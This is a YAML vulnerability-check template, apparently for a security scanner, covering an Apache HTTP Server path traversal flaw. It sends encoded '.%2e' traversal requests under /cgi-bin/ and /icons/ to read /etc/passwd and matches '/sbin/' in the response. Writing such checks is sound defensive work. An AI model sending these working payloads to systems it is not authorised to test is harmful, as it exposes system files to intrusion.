app: Apache
query: header:"apache"
meta:
  name: Apache HTTP Server 路径穿越漏洞
  level: 4
  tags:
    - path_traversal
  description: 攻击者可以使用路径遍历攻击将URL映射到预期文档根以外的文件。如果文档根目录以外的文件不受`require all denied`保护，则攻击者可以访问这些文件。
  homepage: https://httpd.apache.org/
  author: 一曲成殇
  references: https://mp.weixin.qq.com/s/XEnjVwb9I0GPG9RG-v7lHQ
  solution: 升级官方版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: GET
            path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: /sbin/
              type: contains
            - name: code
              value: "200"
              type: equals
        - request:
            method: GET
            path: /icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: /sbin/
              type: contains
  create_at: "2021-11-05 22:11:14"
